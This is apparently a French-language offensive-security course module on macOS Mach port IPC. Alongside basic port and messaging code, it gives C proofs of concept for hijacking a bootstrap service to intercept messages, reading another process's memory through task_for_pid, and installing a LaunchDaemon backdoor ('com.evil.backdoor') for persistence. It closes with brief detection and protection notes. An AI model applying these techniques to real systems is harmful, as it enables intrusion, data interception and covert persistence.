# Module M04 : Mach Ports - Communication IPC sur macOS

## Objectifs

A la fin de ce module, vous serez capable de :
- Comprendre le système Mach Ports et son rôle dans l'IPC macOS
- Créer et manipuler des ports Mach pour la communication inter-processus
- Envoyer et recevoir des messages via Mach
- Identifier les vecteurs d'attaque basés sur Mach Ports
- Exploiter les ports Mach pour l'énumération et le pivotement

## 1. Introduction aux Mach Ports

### 1.1 Qu'est-ce qu'un Mach Port ?

Imaginez une **boîte aux lettres** dans un immeuble. Chaque appartement (processus) a sa propre boîte, et les résidents peuvent s'envoyer des messages en déposant des lettres dans les boîtes des autres.

**Mach Ports** = système de communication entre processus (IPC) de macOS, hérité du microkernel Mach.

```ascii
ANALOGIE : SYSTÈME DE BOÎTES AUX LETTRES

┌─────────────────────────────────────────────────┐
│                   KERNEL                        │
│                                                 │
│   ┌──────────┐      ┌──────────┐               │
│   │ Port 101 │      │ Port 102 │               │
│   │ "Safari" │      │ "Dock"   │               │
│   └────┬─────┘      └────┬─────┘               │
│        │                 │                      │
└────────┼─────────────────┼──────────────────────┘
         │                 │
    ┌────▼────┐       ┌────▼────┐
    │ Safari  │       │  Dock   │
    │ Process │       │ Process │
    └─────────┘       └─────────┘

Message : Safari → Port 102 (Dock) → Dock reçoit
```

### 1.2 Pourquoi Mach Ports en Offensive Security ?

Les Mach Ports sont **critiques** pour :
- **Énumération** : lister les ports = découvrir services/processus
- **IPC Hijacking** : intercepter communications entre processus
- **Privilege Escalation** : certains ports ont des droits élevés
- **Persistence** : créer des services via Mach
- **C2 Communication** : canal IPC furtif pour implants

## 2. Concepts Fondamentaux

### 2.1 Anatomie d'un Port Mach

```ascii
STRUCTURE D'UN MACH PORT

┌─────────────────────────────────────────────┐
│           MACH PORT (noyau)                 │
├─────────────────────────────────────────────┤
│ Port Name : 0x507 (entier 32-bit)          │
│ Port Rights :                               │
│   - SEND     : peut envoyer messages        │
│   - RECEIVE  : peut recevoir messages       │
│   - SEND_ONCE: envoi unique                 │
├─────────────────────────────────────────────┤
│ Queue de Messages :                         │
│   ┌───────────────┐                         │
│   │ Message 1     │ ← plus ancien           │
│   ├───────────────┤                         │
│   │ Message 2     │                         │
│   ├───────────────┤                         │
│   │ Message 3     │ ← plus récent           │
│   └───────────────┘                         │
└─────────────────────────────────────────────┘

PORT NAME ≠ PORT
  - Port Name = identifiant local (comme un file descriptor)
  - Port = objet kernel réel
```

### 2.2 Les Droits sur les Ports (Port Rights)

```ascii
TYPES DE DROITS

┌──────────────────────────────────────────────────────┐
│ MACH_PORT_RIGHT_SEND                                 │
│   → Permet d'ENVOYER des messages au port            │
│   → Plusieurs processus peuvent avoir SEND           │
│   → Comme "adresse email publique"                   │
├──────────────────────────────────────────────────────┤
│ MACH_PORT_RIGHT_RECEIVE                              │
│   → Permet de RECEVOIR les messages                  │
│   → UN SEUL processus peut avoir RECEIVE             │
│   → Comme "clé de la boîte aux lettres"              │
├──────────────────────────────────────────────────────┤
│ MACH_PORT_RIGHT_SEND_ONCE                            │
│   → Envoi unique puis autodestruction du droit       │
│   → Utilisé pour les réponses                        │
└──────────────────────────────────────────────────────┘

EXEMPLE :

Process A                Process B
┌───────┐                ┌───────┐
│ SEND  │───Message──────│RECEIVE│
└───────┘                └───────┘
    ↓                        ↓
Port Name: 0x507        Port Name: 0x103
(SEND right)            (RECEIVE right)
         \               /
          \             /
           ▼           ▼
        ┌───────────────┐
        │  KERNEL PORT  │
        │  (objet réel) │
        └───────────────┘
```

### 2.3 Communication Mach : Envoi/Réception

```ascii
FLUX DE COMMUNICATION

1. Process A veut parler à Process B

┌─────────────┐                           ┌─────────────┐
│  Process A  │                           │  Process B  │
│             │                           │             │
│ 1. Allouer  │                           │ 1. Créer    │
│    port     │                           │    port     │
│             │                           │             │
│ 2. Obtenir  │                           │ 2. Écouter  │
│    SEND     │◄──────[bootstrap]─────────│    RECEIVE  │
│    right    │                           │             │
│             │                           │             │
│ 3. Créer    │                           │             │
│    message  │                           │             │
│             │                           │             │
│ 4. mach_msg │──────────Message────────► │ 5. mach_msg │
│    (SEND)   │                           │    (RECEIVE)│
│             │                           │             │
│ 6. Attendre │◄─────────Reply────────────│ 7. Répondre │
│    réponse  │                           │             │
└─────────────┘                           └─────────────┘
```

## 3. Mise en Pratique - Code C

### 3.1 Créer un Port et Obtenir ses Droits

```c
#include <mach/mach.h>
#include <stdio.h>

int main() {
    mach_port_t port;
    kern_return_t kr;

    // Allouer un nouveau port (obtient automatiquement RECEIVE right)
    kr = mach_port_allocate(
        mach_task_self(),           // Notre task
        MACH_PORT_RIGHT_RECEIVE,    // Type de droit
        &port                       // Port créé (stocké ici)
    );

    if (kr != KERN_SUCCESS) {
        printf("Erreur : %s\n", mach_error_string(kr));
        return 1;
    }

    printf("[+] Port créé : 0x%x\n", port);
    printf("[+] Droits : RECEIVE\n");

    // Insérer un SEND right (pour pouvoir s'envoyer des messages)
    kr = mach_port_insert_right(
        mach_task_self(),
        port,
        port,
        MACH_MSG_TYPE_MAKE_SEND
    );

    printf("[+] SEND right ajouté\n");

    return 0;
}
```

### 3.2 Envoyer un Message Simple

```c
#include <mach/mach.h>
#include <string.h>

// Structure du message (doit hériter de mach_msg_header_t)
typedef struct {
    mach_msg_header_t header;
    char data[256];
} simple_message_t;

void send_message(mach_port_t port, const char *text) {
    simple_message_t msg;

    // Configurer le header
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg.header.msgh_size = sizeof(msg);
    msg.header.msgh_remote_port = port;  // Destination
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_id = 1337;           // ID arbitraire

    // Copier données
    strncpy(msg.data, text, sizeof(msg.data) - 1);

    // Envoyer
    kern_return_t kr = mach_msg(
        &msg.header,                // Message
        MACH_SEND_MSG,              // Option : envoi
        msg.header.msgh_size,       // Taille envoi
        0,                          // Taille réception (aucune)
        MACH_PORT_NULL,             // Port de réception (aucun)
        MACH_MSG_TIMEOUT_NONE,      // Timeout
        MACH_PORT_NULL              // Notification
    );

    if (kr == KERN_SUCCESS) {
        printf("[+] Message envoyé : %s\n", text);
    } else {
        printf("[-] Erreur : %s\n", mach_error_string(kr));
    }
}
```

### 3.3 Recevoir un Message

```c
void receive_message(mach_port_t port) {
    simple_message_t msg;

    kern_return_t kr = mach_msg(
        &msg.header,                // Buffer de réception
        MACH_RCV_MSG,               // Option : réception
        0,                          // Taille envoi (aucune)
        sizeof(msg),                // Taille buffer réception
        port,                       // Port à écouter
        MACH_MSG_TIMEOUT_NONE,      // Bloquant
        MACH_PORT_NULL
    );

    if (kr == KERN_SUCCESS) {
        printf("[+] Message reçu (ID %d) : %s\n",
               msg.header.msgh_id, msg.data);
    } else {
        printf("[-] Erreur réception : %s\n", mach_error_string(kr));
    }
}
```

### 3.4 Communication Bidirectionnelle (Client-Serveur)

```c
// SERVEUR
void server() {
    mach_port_t server_port;

    // 1. Créer port
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &server_port);
    mach_port_insert_right(mach_task_self(), server_port, server_port,
                          MACH_MSG_TYPE_MAKE_SEND);

    printf("[SERVER] Port : 0x%x\n", server_port);

    // 2. Boucle d'écoute
    while (1) {
        simple_message_t msg;
        mach_msg(&msg.header, MACH_RCV_MSG, 0, sizeof(msg),
                 server_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

        printf("[SERVER] Reçu : %s\n", msg.data);

        // Répondre
        strcpy(msg.data, "ACK");
        msg.header.msgh_remote_port = msg.header.msgh_remote_port;
        mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0,
                 MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    }
}
```

## 4. Énumération des Ports (Offensive)

### 4.1 Lister Tous les Ports d'un Processus

```c
#include <mach/mach.h>

void enumerate_ports(mach_port_t task) {
    mach_port_name_array_t names;
    mach_port_type_array_t types;
    mach_msg_type_number_t names_count, types_count;

    kern_return_t kr = mach_port_names(
        task,
        &names,
        &names_count,
        &types,
        &types_count
    );

    if (kr != KERN_SUCCESS) {
        printf("[-] Erreur énumération\n");
        return;
    }

    printf("[+] Ports trouvés : %d\n", names_count);

    for (int i = 0; i < names_count; i++) {
        printf("  Port 0x%x - Type : ", names[i]);

        if (types[i] & MACH_PORT_TYPE_SEND)
            printf("SEND ");
        if (types[i] & MACH_PORT_TYPE_RECEIVE)
            printf("RECEIVE ");
        if (types[i] & MACH_PORT_TYPE_SEND_ONCE)
            printf("SEND_ONCE ");

        printf("\n");
    }
}
```

### 4.2 Bootstrap Server - Découverte de Services

Le **Bootstrap Server** est un annuaire de services système. Chaque service macOS s'y enregistre.

```c
#include <servers/bootstrap.h>

void lookup_service(const char *service_name) {
    mach_port_t service_port;
    kern_return_t kr;

    kr = bootstrap_look_up(
        bootstrap_port,     // Port bootstrap global
        service_name,       // Nom du service
        &service_port       // Port retourné
    );

    if (kr == KERN_SUCCESS) {
        printf("[+] Service '%s' trouvé : port 0x%x\n",
               service_name, service_port);
    } else {
        printf("[-] Service '%s' introuvable\n", service_name);
    }
}

// Exemple d'utilisation
int main() {
    lookup_service("com.apple.SecurityServer");
    lookup_service("com.apple.WindowServer");
    lookup_service("com.apple.system.notification_center");
    return 0;
}
```

## 5. Applications Offensives

### 5.1 Énumération Post-Exploitation

```c
// Découvrir tous les services bootstrap (reconnaissance)
void discover_services() {
    mach_port_name_array_t services;
    mach_msg_type_number_t count;

    // Liste exhaustive (non documenté mais fonctionne)
    char *common_services[] = {
        "com.apple.SecurityServer",
        "com.apple.PowerManagement.control",
        "com.apple.tccd",
        "com.apple.audio.SystemSoundServer",
        NULL
    };

    for (int i = 0; common_services[i]; i++) {
        lookup_service(common_services[i]);
    }
}
```

### 5.2 IPC Hijacking (Interception)

Technique : s'enregistrer **avant** le service légitime.

```ascii
ATTAQUE : RACE CONDITION

Normal :
  LaunchDaemon → bootstrap_check_in("com.victim.service") → OK

Attaque :
  1. Malware démarre AVANT LaunchDaemon
  2. Malware → bootstrap_check_in("com.victim.service") → OK
  3. LaunchDaemon → bootstrap_check_in("com.victim.service") → FAIL
  4. Malware reçoit tous les messages destinés au service !
```

```c
// PROOF OF CONCEPT - Hijack d'un service
void hijack_service(const char *service_name) {
    mach_port_t hijacked_port;
    kern_return_t kr;

    // Tenter de s'enregistrer comme service
    kr = bootstrap_check_in(
        bootstrap_port,
        service_name,
        &hijacked_port
    );

    if (kr == KERN_SUCCESS) {
        printf("[!] SERVICE HIJACKED : %s\n", service_name);
        printf("[!] Port : 0x%x\n", hijacked_port);

        // Écouter les messages destinés au service
        while (1) {
            simple_message_t msg;
            mach_msg(&msg.header, MACH_RCV_MSG, 0, sizeof(msg),
                     hijacked_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

            printf("[INTERCEPTED] %s\n", msg.data);
        }
    } else {
        printf("[-] Hijack échoué (service déjà enregistré)\n");
    }
}
```

### 5.3 Task Ports - Contrôle Total d'un Processus

Le **task port** d'un processus = contrôle TOTAL (lecture/écriture mémoire, injection).

```c
#include <mach/mach_vm.h>

// Lire la mémoire d'un processus via son task port
void read_remote_memory(mach_port_t task, mach_vm_address_t address) {
    vm_offset_t data;
    mach_msg_type_number_t data_size;

    kern_return_t kr = mach_vm_read(
        task,
        address,
        256,            // Taille
        &data,
        &data_size
    );

    if (kr == KERN_SUCCESS) {
        printf("[+] Mémoire lue :\n");
        for (int i = 0; i < data_size; i++) {
            printf("%02x ", ((unsigned char*)data)[i]);
        }
        printf("\n");
    }
}

// Obtenir le task port d'un PID
mach_port_t get_task_for_pid(pid_t pid) {
    mach_port_t task;
    kern_return_t kr;

    kr = task_for_pid(
        mach_task_self(),
        pid,
        &task
    );

    if (kr == KERN_SUCCESS) {
        printf("[+] Task port obtenu pour PID %d : 0x%x\n", pid, task);
        return task;
    } else {
        printf("[-] task_for_pid échoué (besoin de root ou entitlement)\n");
        return MACH_PORT_NULL;
    }
}
```

### 5.4 Persistence via Mach Services

```c
// Créer un service persistant (nécessite LaunchDaemon)
void create_persistent_service() {
    // 1. Créer plist dans /Library/LaunchDaemons/
    const char *plist =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<plist version=\"1.0\">\n"
        "<dict>\n"
        "  <key>Label</key>\n"
        "  <string>com.evil.backdoor</string>\n"
        "  <key>MachServices</key>\n"
        "  <dict>\n"
        "    <key>com.evil.backdoor</key>\n"
        "    <true/>\n"
        "  </dict>\n"
        "  <key>ProgramArguments</key>\n"
        "  <array>\n"
        "    <string>/tmp/backdoor</string>\n"
        "  </array>\n"
        "  <key>RunAtLoad</key>\n"
        "  <true/>\n"
        "</dict>\n"
        "</plist>\n";

    // Écrire plist (nécessite root)
    FILE *f = fopen("/Library/LaunchDaemons/com.evil.backdoor.plist", "w");
    if (f) {
        fwrite(plist, 1, strlen(plist), f);
        fclose(f);
        printf("[+] LaunchDaemon créé\n");
    }

    // 2. Charger avec launchctl
    system("launchctl load /Library/LaunchDaemons/com.evil.backdoor.plist");
}
```

## 6. Détection et Défense

### 6.1 Détecter les Anomalies Mach

```bash
# Lister tous les services bootstrap
launchctl list

# Inspecter un service
launchctl print system/com.apple.SecurityServer

# Monitorer les ports (nécessite outil custom)
lsmp  # List Mach Ports (si installé)
```

### 6.2 Protections macOS

- **SIP** : System Integrity Protection limite accès aux task ports système
- **Hardened Runtime** : empêche injection dans processus signés
- **Sandbox** : limite création/accès aux Mach ports
- **Entitlements** : `task_for_pid-allow`, `com.apple.system-task-ports`

## 7. Checklist Compétences

Avant de passer au module suivant, vérifiez que vous savez :

- [ ] Expliquer ce qu'est un Mach Port et son rôle dans l'IPC
- [ ] Créer un port avec `mach_port_allocate()`
- [ ] Envoyer/recevoir des messages avec `mach_msg()`
- [ ] Énumérer les ports d'un processus
- [ ] Utiliser le bootstrap server pour découvrir services
- [ ] Comprendre les risques : task ports, IPC hijacking
- [ ] Identifier les protections macOS contre abus Mach

## 8. Exercices

Voir [exercice.md](exercice.md)

## 9. Ressources

- [Mach IPC Interface](https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html)
- [XNU Source - mach/mach.h](https://github.com/apple-oss-distributions/xnu)
- [Attacking Mach Ports](https://www.youtube.com/watch?v=KHnKZ6P9fFg) - Blackhat Talk
- [iOS/macOS Kernel Programming](https://www.amazon.com/iOS-macOS-Kernel-Programming/dp/1484226615)

---

**Navigation**
- [Module précédent](../M03_dylib_basics/)
- [Module suivant](../M05_codesigning/)
